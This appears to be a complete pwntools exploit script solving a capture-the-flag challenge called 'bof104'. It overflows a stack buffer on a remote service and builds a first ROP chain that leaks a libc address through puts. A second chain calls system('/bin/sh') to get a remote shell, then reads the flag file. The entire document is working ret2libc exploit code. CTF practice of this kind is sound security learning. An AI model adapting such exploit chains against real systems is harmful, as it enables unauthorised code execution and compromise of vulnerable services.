from pwn import *
context.arch = "amd64"

e = ELF('./bof104')
r = remote("bof104.sstf.site", 1337)
libc = ELF("libc.so.6")

# Leak
rop = ROP(e)
rop.puts(e.got["puts"])
rop.bofme()

PAYLOAD = b"\x90" * 0x20 + b"\x41" * 8 + rop.chain()

r.sendline(PAYLOAD)
r.recvline()

LEAK_ADDRESS = u64(r.recvline()[:-1].ljust(8, b"\x00"))
LIBC_ADDRESS = LEAK_ADDRESS - libc.symbols["puts"]

libc.address = LIBC_ADDRESS

SYSTEM_PTR = libc.symbols["system"]
BINSH_PTR = next(libc.search(b"/bin/sh\x00"))

# Get shell
rop = ROP(libc)
rop.raw(rop.ret)
rop.system(BINSH_PTR)

PAYLOAD = b"\x90" * 0x20 + b"\x42" * 8 + rop.chain()

r.sendline(PAYLOAD)
r.sendline(b'cat /flag')
r.interactive()